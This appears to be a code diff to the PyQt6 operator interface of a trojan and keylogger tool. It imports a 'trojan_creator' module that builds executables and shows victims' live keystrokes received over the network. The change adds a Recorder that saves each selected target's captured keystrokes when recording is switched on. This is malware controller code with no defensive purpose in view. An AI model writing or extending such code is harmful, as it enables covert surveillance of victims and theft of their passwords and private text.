@@ -2,7 +2,7 @@ import sys
 import warnings
 import threading
 from PyQt6 import QtWidgets, QtCore, QtGui
-from Storage.database import pull_json, push_json, delete_json
+from Storage.database import pull_json, push_json, delete_json, Recorder
 from Utils.connect import Connect, get_myIp
 from Utils.trojan_creator import create_exe
 from User_interface.Ui_design import Ui_MainWindow, InputDialog
@@ -88,14 +88,20 @@ class Logic(QtWidgets.QMainWindow):
                 self.ui.label_Rec2.setStyleSheet("color: red;")
             return  # no button selected yet
 
+        record = Recorder(self.current_button.text())
         if self.ui.onOffButtonD2.text().lower() == "off":
             self.ui.onOffButtonD2.setText("ON")
             self.ui.label_Rec2.setText("ON")
             self.ui.label_Rec2.setStyleSheet("color: green;")
+
+            # here self.network.get_keystrokes could be your text source
+            record.start(self.get_keystroke)
+
         else:
             self.ui.onOffButtonD2.setText("OFF")
             self.ui.label_Rec2.setText("OFF")
             self.ui.label_Rec2.setStyleSheet("color: red;")
+            record.stop()
 
     def handle_bake(self):
         # Get reference to the last button you interacted with
@@ -234,10 +240,14 @@ class Logic(QtWidgets.QMainWindow):
             push_json(self.storage)
 
     def update_keystrokes(self, keys):
+        self.current_key = keys
         # append keystrokes live
         if self.ui.button_show.isChecked():
             # Update text
             self.ui.Viewlabel.setPlainText(keys)
+
+    def get_keystroke(self):
+        return self.current_key
 
     def update_message(self, msg):
         if msg == "Connected":
